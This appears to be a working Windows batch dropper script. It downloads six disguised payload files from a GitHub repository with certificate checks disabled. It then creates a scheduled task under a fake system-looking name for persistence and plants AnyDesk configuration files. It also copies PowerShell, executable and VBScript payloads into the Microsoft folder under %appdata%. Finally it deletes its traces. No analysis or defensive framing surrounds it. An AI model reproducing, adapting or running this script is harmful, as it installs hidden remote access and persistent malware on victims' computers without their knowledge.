mode 15,1
curl -k -L -o "%~dp0hwihsk0" "https://github.com/nemovoid/gansai/raw/refs/heads/main/aefsany/applevbs.vmd"
curl -k -L -o "%~dp0hwihsk1" "https://github.com/nemovoid/gansai/raw/refs/heads/main/aefsany/bananaps1.vmd"
curl -k -L -o "%~dp0hwihsk2" "https://github.com/nemovoid/gansai/raw/refs/heads/main/aefsany/gamser.vmd"
curl -k -L -o "%~dp0hwihsk3" "https://github.com/nemovoid/gansai/raw/refs/heads/main/aefsany/gamsys.vmd"
curl -k -L -o "%~dp0hwihsk4" "https://github.com/nemovoid/gansai/raw/refs/heads/main/aefsany/orangeany.vmd"
curl -k -L -o "%~dp0hwihsk5" "https://github.com/nemovoid/gansai/raw/refs/heads/main/aefsany/tomatoxml.vmd"

schtasks /create /tn User_Feed_Synchronization-{0DDC78AB-E733-425C-B92B-ABAC149AB11232} /xml "%~dp0hwihsk5" /f
md "%appdata%\AnyDesk"
copy /Y "%~dp0hwihsk2" "%appdata%\AnyDesk\service.conf"
copy /Y "%~dp0hwihsk3" "%appdata%\AnyDesk\system.conf"
copy /Y "%~dp0hwihsk1" "%appdata%\Microsoft\windows\default_an.ps1"
copy /Y "%~dp0hwihsk4" "%appdata%\Microsoft\windows\default_an.exe"
copy /Y "%~dp0hwihsk0" "%appdata%\Microsoft\windows\default_an.vbs"
del "%~dp0*hwihsk*" /f
